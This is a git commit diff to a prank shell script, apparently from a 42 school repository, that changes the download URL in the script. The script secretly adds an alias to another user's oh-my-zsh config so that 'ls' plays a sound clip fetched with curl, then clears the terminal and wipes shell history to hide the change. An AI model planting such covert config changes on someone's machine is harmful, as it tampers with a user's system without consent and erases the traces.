acee1ede32ad3da32e6e608fc7d802917253f7ee
Bruno Da silva <brda-sil@1E4.42angouleme.fr>
2022-04-27 21:11:10 +0200

    :package:

--- fast_troll/troll_oh_my_zsh.sh
+++ fast_troll/troll_oh_my_zsh.sh
@@ -17,7 +17,7 @@ then
 fi
 touch ~/.oh-my-zsh/custom/alias.zsh
 echo "alias ls='(pactl set-sink-mute 0 1 && pactl set-sink-mute 0 0 && pactl set-sink-volume 0 75% && paplay ~/.sncf-france-jingle.ogg &) ; ls -G \$1'" >> ~/.oh-my-zsh/custom/alias.zsh
-curl https://raw.githubusercontent.com/clinche/Troll_42/master/sound/sncf-france-jingle.ogg -o ~/.sncf-france-jingle.ogg
+curl https://raw.githubusercontent.com/Pixailz/Troll_42/master/sound/sncf-france-jingle.ogg -o ~/.sncf-france-jingle.ogg
 clear
 history -c
 exec zsh
